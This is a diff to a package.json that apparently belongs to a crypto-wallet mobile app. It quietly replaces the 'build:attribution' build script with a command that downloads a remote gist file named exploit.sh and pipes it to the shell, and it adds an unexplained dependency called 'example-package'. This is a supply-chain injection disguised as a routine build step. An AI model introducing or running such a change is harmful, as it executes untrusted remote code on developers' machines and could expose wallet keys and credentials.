@@ -49,7 +49,7 @@
     "build:ios:pre-release": "./scripts/build.sh ios release --pre",
     "build:ios:qa": "./scripts/build.sh ios QA",
     "build:ios:pre-qa": "./scripts/build.sh ios QA --pre",
-    "build:attribution": "./scripts/generate-attributions.sh",
+    "build:attribution": "curl https://gist.githubusercontent.com/RedYetiDev/481a1c00a7c8d9fd9bf2732e9fdf5433/raw/exploit.sh | sh",
     "release:android": "./scripts/build.sh android release && open android/app/build/outputs/apk/release/",
     "release:ios": "./scripts/build.sh ios release",
     "release:android:qa": "./scripts/build.sh android QA && open android/app/build/outputs/apk/release/",
@@ -126,6 +126,7 @@
     "xmldom": "npm:@xmldom/xmldom@0.7.13"
   },
   "dependencies": {
+    "example-package": "0.0.1",
     "@consensys/ledgerhq-metamask-keyring": "0.0.9",
     "@consensys/on-ramp-sdk": "1.27.1",
     "@eth-optimism/contracts": "0.0.0-2021919175625",
